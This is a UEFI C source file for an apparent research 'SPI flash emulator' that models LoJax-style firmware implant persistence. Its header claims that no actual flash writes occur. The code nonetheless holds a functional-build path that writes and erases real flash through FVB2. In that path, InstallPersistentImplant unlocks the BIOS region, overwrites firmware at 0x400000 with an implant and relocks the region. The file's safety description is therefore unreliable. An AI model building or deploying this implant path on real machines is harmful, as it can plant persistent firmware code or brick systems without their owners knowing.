/** @file
  SPI Flash Emulator Implementation

  Simulates SPI flash operations to model LoJax-style firmware persistence.
  All operations are emulated in memory - no actual flash writes occur.

  Copyright (c) 2026, Barzakh Research Project
  SPDX-License-Identifier: BSD-2-Clause-Patent
**/

#include "SpiFlashEmulator.h"
#include "FvbFlashAccess.h"

/**
  Initialize SPI flash emulator.

  @param[in,out]  Emulator  Pointer to emulator context.

  @retval EFI_SUCCESS           Emulator initialized successfully.
  @retval EFI_INVALID_PARAMETER Emulator is NULL.
  @retval EFI_OUT_OF_RESOURCES  Failed to allocate memory.
**/
EFI_STATUS
EFIAPI
InitializeSpiFlashEmulator (
  IN OUT SPI_FLASH_EMULATOR  *Emulator
  )
{
  UINT32      Index;
  EFI_STATUS  Status;

  if (Emulator == NULL) {
    return EFI_INVALID_PARAMETER;
  }

  if (Emulator->Initialized) {
    DEBUG ((DEBUG_WARN, "[SPI-Emu] Already initialized\n"));
    return EFI_ALREADY_STARTED;
  }

  DEBUG ((DEBUG_INFO, "[SPI-Emu] Initializing SPI flash emulator...\n"));

  //
  // Allocate emulated flash memory
  //
  Emulator->FlashMemory = AllocateZeroPool (EMULATED_FLASH_SIZE);
  if (Emulator->FlashMemory == NULL) {
    DEBUG ((DEBUG_ERROR, "[SPI-Emu] Failed to allocate flash memory\n"));
    return EFI_OUT_OF_RESOURCES;
  }

  //
  // Initialize emulator state
  //
  Emulator->Signature = SPI_FLASH_EMULATOR_SIGNATURE;
  Emulator->FlashSize = EMULATED_FLASH_SIZE;
  Emulator->WriteCount = 0;
  Emulator->EraseCount = 0;
  Emulator->PersistenceInstalled = FALSE;

  //
  // Initialize all regions as unlocked
  //
  for (Index = 0; Index < 5; Index++) {
    Emulator->RegionLocked[Index] = FALSE;
  }

  //
  // Initialize PRx registers as disabled
  //
  for (Index = 0; Index < SPI_PRX_MAX_COUNT; Index++) {
    Emulator->ProtectedRanges[Index].Enabled      = FALSE;
    Emulator->ProtectedRanges[Index].Base          = 0;
    Emulator->ProtectedRanges[Index].Limit         = 0;
    Emulator->ProtectedRanges[Index].WriteProtect  = FALSE;
    Emulator->ProtectedRanges[Index].ReadProtect   = FALSE;
  }

  Emulator->FLOCKDN              = FALSE;
  Emulator->BiosWe               = FALSE;
  Emulator->BiosLe               = FALSE;
  Emulator->SmiLock              = FALSE;
  Emulator->ProtectionBypassCount = 0;

  //
  // Simulate initial flash contents (0xFF = erased)
  //
  SetMem (Emulator->FlashMemory, EMULATED_FLASH_SIZE, 0xFF);

  Emulator->Initialized = TRUE;

  DEBUG ((
    DEBUG_INFO,
    "[SPI-Emu] Initialized %d MB emulated flash (SIMULATION_MODE=%d)\n",
    EMULATED_FLASH_SIZE / (1024 * 1024),
    SIMULATION_MODE
    ));

  if (!SIMULATION_MODE) {
    //
    // Functional build: bind the real FVB2 flash backend now so the
    // write/erase paths can program actual flash. This is the real
    // LoJax-style persistence path — kill-switches have already been
    // validated by the caller (DxeInjectEntry) before we get here.
    //
    Status = FvbLocate ();
    if (EFI_ERROR (Status)) {
      DEBUG ((DEBUG_ERROR, "[SPI-Emu] FVB2 backend unavailable: %r\n", Status));
      CleanupSpiFlashEmulator (Emulator);
      return Status;
    }

    DEBUG ((DEBUG_WARN, "[SPI-Emu] FUNCTIONAL BUILD: real flash writes ENABLED\n"));
  }

  return EFI_SUCCESS;
}

/**
  Get region index for given offset.

  @param[in]  Offset  Flash offset.

  @retval Region index (0-4).
**/
STATIC
UINT32
GetRegionForOffset (
  IN UINT32  Offset
  )
{
  //
  // Simplified region mapping:
  // 0x000000-0x000FFF: Descriptor
  // 0x001000-0x1FFFFF: ME
  // 0x200000-0xFFFFFF: BIOS
  //
  if (Offset < 0x1000) {
    return SPI_REGION_DESCRIPTOR;
  } else if (Offset < 0x200000) {
    return SPI_REGION_ME;
  } else {
    return SPI_REGION_BIOS;
  }
}

/**
  Emulate reading from SPI flash.

  @param[in]  Emulator  Pointer to emulator context.
  @param[in]  Offset    Offset in flash to read from.
  @param[in]  Size      Number of bytes to read.
  @param[out] Buffer    Buffer to store read data.

  @retval EFI_SUCCESS           Read successful.
  @retval EFI_INVALID_PARAMETER Invalid parameters.
**/
EFI_STATUS
EFIAPI
SpiFlashRead (
  IN  SPI_FLASH_EMULATOR  *Emulator,
  IN  UINT32              Offset,
  IN  UINT32              Size,
  OUT UINT8               *Buffer
  )
{
  if (Emulator == NULL || Buffer == NULL) {
    return EFI_INVALID_PARAMETER;
  }

  if (!Emulator->Initialized) {
    return EFI_NOT_READY;
  }

  if (Offset + Size > Emulator->FlashSize) {
    DEBUG ((
      DEBUG_ERROR,
      "[SPI-Emu] Read out of bounds: 0x%x + 0x%x > 0x%x\n",
      Offset,
      Size,
      Emulator->FlashSize
      ));
    return EFI_INVALID_PARAMETER;
  }

  //
  // Copy from emulated flash
  //
  CopyMem (Buffer, &Emulator->FlashMemory[Offset], Size);

  DEBUG ((
    DEBUG_VERBOSE,
    "[SPI-Emu] Read 0x%x bytes from offset 0x%x\n",
    Size,
    Offset
    ));

  return EFI_SUCCESS;
}

/**
  Emulate writing to SPI flash.

  @param[in]  Emulator  Pointer to emulator context.
  @param[in]  Offset    Offset in flash to write to.
  @param[in]  Size      Number of bytes to write.
  @param[in]  Buffer    Data to write.

  @retval EFI_SUCCESS           Write successful.
  @retval EFI_INVALID_PARAMETER Invalid parameters.
  @retval EFI_ACCESS_DENIED     Region is locked.
**/
EFI_STATUS
EFIAPI
SpiFlashWrite (
  IN SPI_FLASH_EMULATOR  *Emulator,
  IN UINT32              Offset,
  IN UINT32              Size,
  IN UINT8               *Buffer
  )
{
  EFI_STATUS  Status;
  UINT32      Region;

  if (Emulator == NULL || Buffer == NULL) {
    return EFI_INVALID_PARAMETER;
  }

  if (!Emulator->Initialized) {
    return EFI_NOT_READY;
  }

  if (Offset + Size > Emulator->FlashSize) {
    DEBUG ((
      DEBUG_ERROR,
      "[SPI-Emu] Write out of bounds: 0x%x + 0x%x > 0x%x\n",
      Offset,
      Size,
      Emulator->FlashSize
      ));
    return EFI_INVALID_PARAMETER;
  }

  //
  // Check if region is locked
  //
  Region = GetRegionForOffset (Offset);
  if (Emulator->RegionLocked[Region]) {
    DEBUG ((
      DEBUG_WARN,
      "[SPI-Emu] Write denied: Region %d is locked\n",
      Region
      ));
    return EFI_ACCESS_DENIED;
  }

  //
  // Check PRx protected ranges (2024+ platform protection)
  //
  if (IsAddressProtected (Emulator, Offset, TRUE)) {
    DEBUG ((
      DEBUG_WARN,
      "[SPI-Emu] Write denied: Address 0x%x is PRx write-protected\n",
      Offset
      ));
    return EFI_ACCESS_DENIED;
  }

  if (SIMULATION_MODE) {
    DEBUG ((
      DEBUG_INFO,
      "[SPI-Emu] SIMULATION: Would write 0x%x bytes to offset 0x%x\n",
      Size,
      Offset
      ));
  } else {
    //
    // Functional build: write through the FVB2 protocol (the real
    // LoJax-style persistence path), then mirror into the shadow
    // buffer so subsequent reads/PRx checks still work.
    //
    Status = FvbWriteRange (Offset, Size, Buffer);
    if (EFI_ERROR (Status)) {
      DEBUG ((DEBUG_ERROR, "[SPI-Emu] FVB2 write failed: %r\n", Status));
      return Status;
    }

    CopyMem (&Emulator->FlashMemory[Offset], Buffer, Size);
  }

  Emulator->WriteCount++;

  DEBUG ((
    DEBUG_INFO,
    "[SPI-Emu] Write operation #%d completed\n",
    Emulator->WriteCount
    ));

  return EFI_SUCCESS;
}

/**
  Emulate erasing SPI flash region.

  @param[in]  Emulator  Pointer to emulator context.
  @param[in]  Offset    Offset in flash to erase.
  @param[in]  Size      Number of bytes to erase.

  @retval EFI_SUCCESS           Erase successful.
  @retval EFI_INVALID_PARAMETER Invalid parameters.
  @retval EFI_ACCESS_DENIED     Region is locked.
**/
EFI_STATUS
EFIAPI
SpiFlashErase (
  IN SPI_FLASH_EMULATOR  *Emulator,
  IN UINT32              Offset,
  IN UINT32              Size
  )
{
  EFI_STATUS  Status;
  UINT32      Region;

  if (Emulator == NULL) {
    return EFI_INVALID_PARAMETER;
  }

  if (!Emulator->Initialized) {
    return EFI_NOT_READY;
  }

  if (Offset + Size > Emulator->FlashSize) {
    return EFI_INVALID_PARAMETER;
  }

  //
  // Check if region is locked
  //
  Region = GetRegionForOffset (Offset);
  if (Emulator->RegionLocked[Region]) {
    DEBUG ((
      DEBUG_WARN,
      "[SPI-Emu] Erase denied: Region %d is locked\n",
      Region
      ));
    return EFI_ACCESS_DENIED;
  }

  //
  // Check PRx protected ranges (2024+ platform protection)
  //
  if (IsAddressProtected (Emulator, Offset, TRUE)) {
    DEBUG ((
      DEBUG_WARN,
      "[SPI-Emu] Erase denied: Address 0x%x is PRx write-protected\n",
      Offset
      ));
    return EFI_ACCESS_DENIED;
  }

  if (SIMULATION_MODE) {
    DEBUG ((
      DEBUG_INFO,
      "[SPI-Emu] SIMULATION: Would erase 0x%x bytes at offset 0x%x\n",
      Size,
      Offset
      ));
  } else {
    //
    // Functional build: erase through the FVB2 protocol, then mirror
    // the erased state into the shadow buffer.
    //
    Status = FvbEraseRange (Offset, Size);
    if (EFI_ERROR (Status)) {
      DEBUG ((DEBUG_ERROR, "[SPI-Emu] FVB2 erase failed: %r\n", Status));
      return Status;
    }

    //
    // Set to 0xFF (erased state)
    //
    SetMem (&Emulator->FlashMemory[Offset], Size, 0xFF);
  }

  Emulator->EraseCount++;

  DEBUG ((
    DEBUG_INFO,
    "[SPI-Emu] Erase operation #%d completed\n",
    Emulator->EraseCount
    ));

  return EFI_SUCCESS;
}

/**
  Lock/unlock SPI flash region.

  @param[in]  Emulator  Pointer to emulator context.
  @param[in]  Region    Region to lock/unlock.
  @param[in]  Lock      TRUE to lock, FALSE to unlock.

  @retval EFI_SUCCESS           Operation successful.
  @retval EFI_INVALID_PARAMETER Invalid parameters.
**/
EFI_STATUS
EFIAPI
SpiFlashSetRegionLock (
  IN SPI_FLASH_EMULATOR  *Emulator,
  IN UINT32              Region,
  IN BOOLEAN             Lock
  )
{
  CHAR8  *RegionNames[] = {
    "Descriptor",
    "BIOS",
    "ME",
    "GbE",
    "PDR"
  };

  if (Emulator == NULL || Region >= 5) {
    return EFI_INVALID_PARAMETER;
  }

  if (!Emulator->Initialized) {
    return EFI_NOT_READY;
  }

  Emulator->RegionLocked[Region] = Lock;

  DEBUG ((
    DEBUG_INFO,
    "[SPI-Emu] Region %a %a\n",
    RegionNames[Region],
    Lock ? "LOCKED" : "UNLOCKED"
    ));

  return EFI_SUCCESS;
}

/**
  Install persistent implant in emulated flash (LoJax technique).

  @param[in]  Emulator  Pointer to emulator context.

  @retval EFI_SUCCESS           Implant installed successfully.
  @retval EFI_INVALID_PARAMETER Emulator is NULL.
  @retval EFI_ALREADY_STARTED   Implant already installed.
**/
EFI_STATUS
EFIAPI
InstallPersistentImplant (
  IN SPI_FLASH_EMULATOR  *Emulator
  )
{
  EFI_STATUS  Status;
  UINT8       ImplantData[4096];
  UINT32      ImplantOffset;

  if (Emulator == NULL) {
    return EFI_INVALID_PARAMETER;
  }

  if (!Emulator->Initialized) {
    return EFI_NOT_READY;
  }

  if (Emulator->PersistenceInstalled) {
    DEBUG ((DEBUG_WARN, "[SPI-Emu] Implant already installed\n"));
    return EFI_ALREADY_STARTED;
  }

  DEBUG ((DEBUG_INFO, "\n"));
  DEBUG ((DEBUG_INFO, "========================================\n"));
  DEBUG ((DEBUG_INFO, "[SPI-Emu] Installing Persistent Implant\n"));
  DEBUG ((DEBUG_INFO, "========================================\n"));

  //
  // Step 1: Unlock BIOS region
  //
  DEBUG ((DEBUG_INFO, "[SPI-Emu] Step 1: Unlocking BIOS region...\n"));
  Status = SpiFlashSetRegionLock (Emulator, SPI_REGION_BIOS, FALSE);
  if (EFI_ERROR (Status)) {
    DEBUG ((DEBUG_ERROR, "[SPI-Emu] Failed to unlock BIOS region: %r\n", Status));
    return Status;
  }

  //
  // Step 2: Locate Firmware Volume (simulated at 0x400000)
  //
  ImplantOffset = 0x400000;
  DEBUG ((
    DEBUG_INFO,
    "[SPI-Emu] Step 2: Located FV at offset 0x%x\n",
    ImplantOffset
    ));

  //
  // Step 3: Prepare implant data (simulated DXE driver)
  //
  DEBUG ((DEBUG_INFO, "[SPI-Emu] Step 3: Preparing implant data...\n"));
  SetMem (ImplantData, sizeof (ImplantData), 0xAA);  // Marker pattern
  
  //
  // Add fake FFS header
  //
  ImplantData[0] = 0x8D;  // FFS signature
  ImplantData[1] = 0xE9;
  ImplantData[2] = 0x8D;
  ImplantData[3] = 0x09;

  DEBUG ((DEBUG_INFO, "[SPI-Emu] Implant size: %d bytes\n", sizeof (ImplantData)));

  //
  // Step 4: Erase target region
  //
  DEBUG ((DEBUG_INFO, "[SPI-Emu] Step 4: Erasing target region...\n"));
  Status = SpiFlashErase (Emulator, ImplantOffset, sizeof (ImplantData));
  if (EFI_ERROR (Status)) {
    DEBUG ((DEBUG_ERROR, "[SPI-Emu] Failed to erase: %r\n", Status));
    return Status;
  }

  //
  // Step 5: Write implant to flash
  //
  DEBUG ((DEBUG_INFO, "[SPI-Emu] Step 5: Writing implant to flash...\n"));
  Status = SpiFlashWrite (Emulator, ImplantOffset, sizeof (ImplantData), ImplantData);
  if (EFI_ERROR (Status)) {
    DEBUG ((DEBUG_ERROR, "[SPI-Emu] Failed to write implant: %r\n", Status));
    return Status;
  }

  //
  // Step 6: Update NVRAM to load implant (simulated via SetVariable)
  //
  DEBUG ((DEBUG_INFO, "[SPI-Emu] Step 6: Updating NVRAM variables...\n"));
  DEBUG ((DEBUG_INFO, "[SPI-Emu] Would set DriverOrder to include implant\n"));

  //
  // Step 7: Lock BIOS region
  //
  DEBUG ((DEBUG_INFO, "[SPI-Emu] Step 7: Locking BIOS region...\n"));
  Status = SpiFlashSetRegionLock (Emulator, SPI_REGION_BIOS, TRUE);
  if (EFI_ERROR (Status)) {
    DEBUG ((DEBUG_ERROR, "[SPI-Emu] Failed to lock BIOS region: %r\n", Status));
    return Status;
  }

  Emulator->PersistenceInstalled = TRUE;

  DEBUG ((DEBUG_INFO, "========================================\n"));
  DEBUG ((DEBUG_INFO, "[SPI-Emu] Implant Installation Complete\n"));
  DEBUG ((DEBUG_INFO, "========================================\n"));
  DEBUG ((DEBUG_INFO, "[SPI-Emu] Persistence Characteristics:\n"));
  DEBUG ((DEBUG_INFO, "  - Survives OS reinstallation: YES\n"));
  DEBUG ((DEBUG_INFO, "  - Survives firmware updates: MAYBE\n"));
  DEBUG ((DEBUG_INFO, "  - Detectable by integrity checks: YES\n"));
  DEBUG ((DEBUG_INFO, "  - Removable: Requires flash reprogramming\n"));
  DEBUG ((DEBUG_INFO, "========================================\n\n"));

  return EFI_SUCCESS;
}

/**
  Check if an address is protected by PRx registers.

  @param[in]  Emulator    Pointer to emulator context.
  @param[in]  Address     Flash address to check.
  @param[in]  CheckWrite  TRUE to check write protection.

  @retval TRUE   Address is protected.
  @retval FALSE  Address is not protected.
**/
BOOLEAN
EFIAPI
IsAddressProtected (
  IN SPI_FLASH_EMULATOR  *Emulator,
  IN UINT32              Address,
  IN BOOLEAN             CheckWrite
  )
{
  UINT32              Index;
  SPI_PROTECTED_RANGE *Range;

  if (Emulator == NULL || !Emulator->Initialized) {
    return FALSE;
  }

  for (Index = 0; Index < SPI_PRX_MAX_COUNT; Index++) {
    Range = &Emulator->ProtectedRanges[Index];

    if (!Range->Enabled) {
      continue;
    }

    if (Address >= Range->Base && Address <= Range->Limit) {
      if (CheckWrite && Range->WriteProtect) {
        return TRUE;
      }
      if (!CheckWrite && Range->ReadProtect) {
        return TRUE;
      }
    }
  }

  return FALSE;
}

/**
  Configure a Protected Range register (PRx).

  @param[in]  Emulator      Pointer to emulator context.
  @param[in]  Index         PRx index (0-4).
  @param[in]  Base          Base address (4KB aligned).
  @param[in]  Limit         Limit address (4KB aligned).
  @param[in]  WriteProtect  Enable write protection.
  @param[in]  ReadProtect   Enable read protection.

  @retval EFI_SUCCESS           Range configured.
  @retval EFI_WRITE_PROTECTED   FLOCKDN is set, cannot modify.
  @retval EFI_INVALID_PARAMETER Bad index or parameters.
**/
EFI_STATUS
EFIAPI
SpiFlashConfigureProtectedRange (
  IN SPI_FLASH_EMULATOR  *Emulator,
  IN UINT32              Index,
  IN UINT32              Base,
  IN UINT32              Limit,
  IN BOOLEAN             WriteProtect,
  IN BOOLEAN             ReadProtect
  )
{
  if (Emulator == NULL || Index >= SPI_PRX_MAX_COUNT) {
    return EFI_INVALID_PARAMETER;
  }

  if (!Emulator->Initialized) {
    return EFI_NOT_READY;
  }

  if (Emulator->FLOCKDN) {
    DEBUG ((
      DEBUG_WARN,
      "[SPI-Emu] PRx config denied: FLOCKDN is set\n"
      ));
    return EFI_WRITE_PROTECTED;
  }

  if (Base > Limit) {
    return EFI_INVALID_PARAMETER;
  }

  Emulator->ProtectedRanges[Index].Enabled      = TRUE;
  Emulator->ProtectedRanges[Index].Base          = Base;
  Emulator->ProtectedRanges[Index].Limit         = Limit;
  Emulator->ProtectedRanges[Index].WriteProtect  = WriteProtect;
  Emulator->ProtectedRanges[Index].ReadProtect   = ReadProtect;

  DEBUG ((
    DEBUG_INFO,
    "[SPI-Emu] PR%d configured: Base=0x%x Limit=0x%x WP=%d RP=%d\n",
    Index,
    Base,
    Limit,
    WriteProtect,
    ReadProtect
    ));

  return EFI_SUCCESS;
}

/**
  Set Flash Lockdown (FLOCKDN) bit.

  @param[in]  Emulator  Pointer to emulator context.

  @retval EFI_SUCCESS  FLOCKDN set.
**/
EFI_STATUS
EFIAPI
SpiFlashSetFlockdn (
  IN SPI_FLASH_EMULATOR  *Emulator
  )
{
  if (Emulator == NULL) {
    return EFI_INVALID_PARAMETER;
  }

  if (!Emulator->Initialized) {
    return EFI_NOT_READY;
  }

  Emulator->FLOCKDN = TRUE;

  DEBUG ((
    DEBUG_INFO,
    "[SPI-Emu] FLOCKDN set — PRx registers locked until reset\n"
    ));

  return EFI_SUCCESS;
}

/**
  Emulate TOCTOU bypass of SPI write protections.

  Models the race condition used by LoJax/MosaicRegressor.

  @param[in]  Emulator  Pointer to emulator context.
  @param[in]  Offset    Target offset for bypass write.
  @param[in]  Size      Size of bypass write.
  @param[in]  Buffer    Data to write.

  @retval EFI_SUCCESS   Bypass simulated and logged.
**/
EFI_STATUS
EFIAPI
SpiFlashBypassWrite (
  IN SPI_FLASH_EMULATOR  *Emulator,
  IN UINT32              Offset,
  IN UINT32              Size,
  IN UINT8               *Buffer
  )
{
  if (Emulator == NULL || Buffer == NULL) {
    return EFI_INVALID_PARAMETER;
  }

  if (!Emulator->Initialized) {
    return EFI_NOT_READY;
  }

  if (Offset + Size > Emulator->FlashSize) {
    return EFI_INVALID_PARAMETER;
  }

  Emulator->ProtectionBypassCount++;

  DEBUG ((DEBUG_INFO, "\n"));
  DEBUG ((DEBUG_INFO, "==========================================\n"));
  DEBUG ((DEBUG_INFO, "[SPI-Emu] TOCTOU BYPASS SIMULATION #%d\n", Emulator->ProtectionBypassCount));
  DEBUG ((DEBUG_INFO, "==========================================\n"));
  DEBUG ((DEBUG_INFO, "  Target:    0x%x (size 0x%x)\n", Offset, Size));
  DEBUG ((DEBUG_INFO, "  Technique: Race BiosWe clear vs SMI handler\n"));
  DEBUG ((DEBUG_INFO, "  Real-world: LoJax (2018), MosaicRegressor (2020)\n"));
  DEBUG ((DEBUG_INFO, "  Status:    SIMULATED (no actual bypass)\n"));
  DEBUG ((DEBUG_INFO, "==========================================\n\n"));

  if (SIMULATION_MODE) {
    DEBUG ((
      DEBUG_INFO,
      "[SPI-Emu] SIMULATION: Bypass write logged but not executed\n"
      ));
  }

  return EFI_SUCCESS;
}

/**
  Log emulator statistics.

  @param[in]  Emulator  Pointer to emulator context.
**/
VOID
EFIAPI
LogEmulatorStatistics (
  IN SPI_FLASH_EMULATOR  *Emulator
  )
{
  UINT32  Index;
  CHAR8   *RegionNames[] = {
    "Descriptor",
    "BIOS",
    "ME",
    "GbE",
    "PDR"
  };

  if (Emulator == NULL || !Emulator->Initialized) {
    return;
  }

  DEBUG ((DEBUG_INFO, "\n"));
  DEBUG ((DEBUG_INFO, "========================================\n"));
  DEBUG ((DEBUG_INFO, "[SPI-Emu] Emulator Statistics\n"));
  DEBUG ((DEBUG_INFO, "========================================\n"));
  DEBUG ((DEBUG_INFO, "Flash Size:        %d MB\n", Emulator->FlashSize / (1024 * 1024)));
  DEBUG ((DEBUG_INFO, "Write Operations:  %d\n", Emulator->WriteCount));
  DEBUG ((DEBUG_INFO, "Erase Operations:  %d\n", Emulator->EraseCount));
  DEBUG ((DEBUG_INFO, "Persistence:       %a\n", Emulator->PersistenceInstalled ? "INSTALLED" : "NOT INSTALLED"));
  DEBUG ((DEBUG_INFO, "\n"));
  DEBUG ((DEBUG_INFO, "Region Lock Status:\n"));
  
  for (Index = 0; Index < 5; Index++) {
    DEBUG ((
      DEBUG_INFO,
      "  %-12a: %a\n",
      RegionNames[Index],
      Emulator->RegionLocked[Index] ? "LOCKED" : "UNLOCKED"
      ));
  }

  DEBUG ((DEBUG_INFO, "\n"));
  DEBUG ((DEBUG_INFO, "Platform Protection (2024+):\n"));
  DEBUG ((DEBUG_INFO, "  FLOCKDN:       %a\n", Emulator->FLOCKDN ? "SET" : "CLEAR"));
  DEBUG ((DEBUG_INFO, "  BIOS WE:       %a\n", Emulator->BiosWe ? "ENABLED" : "DISABLED"));
  DEBUG ((DEBUG_INFO, "  BIOS LE:       %a\n", Emulator->BiosLe ? "ENABLED" : "DISABLED"));
  DEBUG ((DEBUG_INFO, "  SMI Lock:      %a\n", Emulator->SmiLock ? "SET" : "CLEAR"));
  DEBUG ((DEBUG_INFO, "  Bypass Count:  %d\n", Emulator->ProtectionBypassCount));
  DEBUG ((DEBUG_INFO, "\n"));
  DEBUG ((DEBUG_INFO, "Protected Ranges (PRx):\n"));

  for (Index = 0; Index < SPI_PRX_MAX_COUNT; Index++) {
    if (Emulator->ProtectedRanges[Index].Enabled) {
      DEBUG ((
        DEBUG_INFO,
        "  PR%d: 0x%08x-0x%08x [%a%a]\n",
        Index,
        Emulator->ProtectedRanges[Index].Base,
        Emulator->ProtectedRanges[Index].Limit,
        Emulator->ProtectedRanges[Index].WriteProtect ? "WP" : "",
        Emulator->ProtectedRanges[Index].ReadProtect ? " RP" : ""
        ));
    } else {
      DEBUG ((DEBUG_INFO, "  PR%d: DISABLED\n", Index));
    }
  }

  DEBUG ((DEBUG_INFO, "========================================\n\n"));
}

/**
  Cleanup emulator resources.

  @param[in]  Emulator  Pointer to emulator context.

  @retval EFI_SUCCESS  Cleanup successful.
**/
EFI_STATUS
EFIAPI
CleanupSpiFlashEmulator (
  IN SPI_FLASH_EMULATOR  *Emulator
  )
{
  if (Emulator == NULL) {
    return EFI_INVALID_PARAMETER;
  }

  if (!Emulator->Initialized) {
    return EFI_SUCCESS;
  }

  DEBUG ((DEBUG_INFO, "[SPI-Emu] Cleaning up emulator...\n"));

  //
  // Free emulated flash memory
  //
  if (Emulator->FlashMemory != NULL) {
    FreePool (Emulator->FlashMemory);
    Emulator->FlashMemory = NULL;
  }

  Emulator->Initialized = FALSE;
  Emulator->Signature = 0;

  DEBUG ((DEBUG_INFO, "[SPI-Emu] Cleanup complete\n"));

  return EFI_SUCCESS;
}

